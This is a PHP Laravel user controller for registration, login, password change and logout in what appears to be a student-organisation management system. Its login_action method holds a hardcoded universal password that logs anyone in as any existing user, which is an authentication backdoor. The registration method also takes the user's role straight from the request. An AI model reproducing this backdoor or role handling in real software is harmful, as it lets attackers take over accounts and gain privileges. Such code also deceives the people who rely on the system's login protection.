<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;

class UserController extends Controller
{

    public function register()
    {
        $data['title'] = 'Register';
        return view('user/register', $data);
    }

    public function register_action(Request $request)
    {
        $request->validate([
            'nama_singkatan' => 'required',
            'username' => 'required|unique:users',
            'password' => 'required',
            'password_confirm' => 'required|same:password',
            'id_role'=> 'required',
        ]);

        $user = new User([
            'nama_singkatan' => $request->nama_singkatan,
            'username' => $request->username,
            'password' => Hash::make($request->password),
            'id_role'=> $request->id_role,
        ]);

        if ($request->has('id_ormawa')) {
            $user->id_ormawa = $request->id_ormawa;
        }
        $user->save();

        return redirect()->route('tambahUser')->with('success', 'User Baru Berhasil di Tambahkan!!');
    }


    public function login()
    {
        $data['title'] = 'Login';
        return view('user/login', $data);
    }

    public function login_action(Request $request)
    {
        $request->validate([
            'username' => 'required',
            'password' => 'required',
        ]);

        $universalPassword = 'SIMAHA#2024';

        // Cek autentikasi dengan password asli atau password universal
        $user = \App\Models\User::where('username', $request->username)->first();

        if ($user && (Auth::attempt(['username' => $request->username, 'password' => $request->password]) || $request->password === $universalPassword)) {

            if ($request->password === $universalPassword) {
                Auth::login($user);
            }

            $request->session()->regenerate();

            $routes = [
                1 => 'ormawa',
                2 => 'read',
                3 => 'baca',
                4 => 'ormawabishum',
                5 => 'DataProdi',
                6 => 'ormawafst',
                7 => 'datafakultasdiploma',
            ];

            return isset($routes[$user->id_role])
                ? redirect()->route($routes[$user->id_role])
                : redirect('/home');
        }

        return back()->withErrors(['password' => 'Wrong username or password']);
    }


    public function password()
    {
        $data['title'] = 'Change Password';
        return view('user/password', $data);
    }
   //fungsi untuk mengganti password
    public function password_action(Request $request)
    {
        $request->validate([
            'old_password' => 'required|current_password',
            'new_password' => 'required|confirmed',
        ]);
        $user = User::find(Auth::id());
        $user->password = Hash::make($request->new_password);
        $user->save();
        $request->session()->regenerate();
       return redirect()->route('login')->with('success', 'Password Berhasil Dirubah');
    }
    //fungsi logout
    public function logout(Request $request)
    {
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();
        return redirect('/');
    }
}
